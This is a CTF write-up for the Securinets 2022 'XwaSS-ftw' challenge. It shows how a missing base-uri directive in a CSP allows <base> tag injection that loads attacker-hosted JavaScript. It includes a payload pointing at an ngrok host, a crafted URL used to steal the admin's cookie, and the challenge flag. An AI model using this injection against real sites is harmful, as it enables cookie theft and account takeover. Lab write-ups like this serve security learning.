# Securinets-CTF-Finals-2022  
## XwaSS-ftw Writeup


This challenge was about achieving an XSS by bypassing the CSP

Challenge :

![image](https://user-images.githubusercontent.com/58823465/167916910-78285058-5944-4b8d-8de8-55650fc0cca5.png)


We can find the CSP in the source code 

``` 
<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-uupQ2er9ZEFzu3';connect-src 'self';style-src 'self';font-src 'self';object-src 'none'">
```
First i checked if the "nonce" is a fixed string so we can abuse it but it seems to be dynamic so i ditched that idea quickly and used the CSP validator to get more of an idea about this CSP

![image](https://user-images.githubusercontent.com/58823465/167917258-82fea6ed-7a13-4b8c-838d-e240c89e3966.png)

We can see the the "base-uri missing" meaning we can use `` <base> `` tags and use a technique called Dangling Markup injection.

So to abuse this we can try and redirect to a url just to test if the base tags are working

We can use this payload

```
'><base href="https://example.com">
``` 

![image](https://user-images.githubusercontent.com/58823465/167918956-ef963dd8-37d1-4fcd-87af-441eee9ce375.png)

and we can notice in the console this particular error 

![image](https://user-images.githubusercontent.com/58823465/167918067-d5b8dc28-87d5-4709-90e0-dd8c7af14469.png)

This means it's trying to fetch the relative path `` /assets/js/bootstrap.js ``, so all we need to do is spin up our own server and add the same relative path and inject some xss in the file "bootstrap.js"

So this is the setup for the server 

![image](https://user-images.githubusercontent.com/58823465/167920326-329be168-ac77-4f9f-aca2-84f29e83bb7a.png)

**note: Make sure to start your ngrok server in the same directory for the /assets/js/bootstrap.js**

so using the payload :

``` '><base href="http://7923-41-225-41-253.ngrok.io"> ```


![image](https://user-images.githubusercontent.com/58823465/167920555-2f43deff-dbb3-4247-a1ba-d16c38d5f14d.png)


And yes !! we get an XSS !!

Now all we have to do is to steal the admin cookie through the report endpoint with our custom ngrok server

![image](https://user-images.githubusercontent.com/58823465/167920820-9cd44941-e9f6-4c1d-b9e9-ee23bd8cd03b.png)


and then we send this url to the admin to steal his cookie !

```http://challenge_link/index.php?src='><base href="http://7923-41-225-41-253.ngrok.io">```

![image](https://user-images.githubusercontent.com/58823465/167921246-78c3a39f-7b38-456c-9890-a611819ca7de.png)



And there you go !! we found our flag :D


``` Flag : Securinets{CSP_W1Th_BaSE_Is_GooD_Nah?} ```


Resources : 

https://klefz.se/2020/11/10/bugpoc-xss-ctf-november-2020-write-up/

https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass


